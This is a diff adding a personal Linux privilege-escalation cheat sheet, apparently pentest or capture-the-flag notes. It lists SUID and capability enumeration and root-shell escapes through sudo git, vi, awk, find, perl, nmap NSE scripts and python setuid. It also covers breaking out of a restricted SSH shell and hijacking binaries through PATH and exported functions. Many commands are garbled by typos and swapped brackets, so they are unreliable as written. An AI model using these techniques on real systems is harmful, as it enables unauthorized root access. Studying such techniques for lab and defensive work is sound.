@@ -1,0 +1,94 @@
+find / -perm -u=s -type f 2>/dev/null
+
+sh-c 'cp $(which bash); chmod +s ./bash'
+/bash -p
+------------------------------------------
+sudo git -p -help
+!/bin/bash //Pagination root Priviledge Escalation
+------------------------------------------
+#From Within Vi:
+:set shell=/bin/sh 
+:shell
+
+#From within IRB:
+exec "/bin/sh"
+
+awk--> awk 'BEGIN (system("/bin/bash")}'
+find--> find / -exec /usr/bin/awk 'BEGIN (system("/bin/bash")}' \;
+perl--> perl -e 'exec "/bin/bash":'
+
+1. First for this method, find which bin file 'awk' is in
+find / -name udev -exec /usr/bin/awk 'BEGIN (system("/bin/bash -i"}}' \;
+
+#-------------Jailed SSH Shell? Try this.... -------------
+Initial Shell /bin/sh
+If BASH is blocked.
+Check the 'env' variable!
+Linux will default to /bin/bash default bashrc if there is no present .bashrc file in a User's home directory. Legit shell...)
+
+1. ssh sara@127.0.0.1 "/bin/sh"
+2. cd SHOME
+3. mv .bashrc.bashrc.BAK (Yes, this actually worked.)
+4. exit
+5. ssh sara@127.0.0.1
+$ Bling Bling $
+sara@SkyTower:-$
+
+Once Broken Out Before Privesc Reference Perform These Commands=====
+find/-perm -2 | -type 1 -1s 2>/dev/null | sort -r
+
+
+=====================================================================================
+quick look at /var/lib
+quick look at /var/db
+Anything interesting?
+
+find / -perm -2 ! -type l -ls 2>/dev/null
+If there is a username. Should locate files on the system containing their username
+
+===========================================
+#Should check
+
+getcap /r 2>/dev/null 
+env 
+sudo -l
+===========================================
+#Nmap escalation through a NSE script
+
+echo "os.execute('/bin/sh')">/tmp/root.nse
+sudo nmap --script=/tmp/root.nse
+
+===========================================
+SUID BINARIES nmap, vim, find, bash, more, less, nano, cp 
+https://pentestlab.blog/2017/09/25/suid-executables/ 
+https://github.com/xapax/security/blob/master/privilege_escalation_-_linux.md
+
+#Find SUID
+find / -perm -u=s -type f 2>/dev/null
+#Find GUID
+find / -perm -g=s -type f 2>/dev/null
+#File Capabilties (extended priviledge -ep?)
+getcap -r / 2>/dev/null
+python -c 'import os; os.setuid(0); os.system("/bin/bash")'
+
+#Looks in common places for SUID SGID files in BIN: Very Nice.---------
+for i in 'locate -r "bin$"'; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done 
+[Check for pkexec or other Interestings]
+
+Is ASLR Enabled?
+cat /proc/sys/kernel/randomize_va_space
+(If it returns 2, then yes, if nothing...well >)
+
+====IS THERE A USER? FRSKIGOD?===
+1s -1sa /home/
+YES?
+find / -iname 'USERNAME' 2>/dev/null 
+
+Adding a binary to PATH, to hijack another SUID binary invokes it without the fully qualified path.
+$ function /usr/bin/foo () (/usr/bin/echo "It works"; }
+$ export -f /usr/bin/foo
+$ /usr/bin/foo
+    It works
+
+//Get Valid Users.
+grep -vE "nologin|false" /etc/passwd
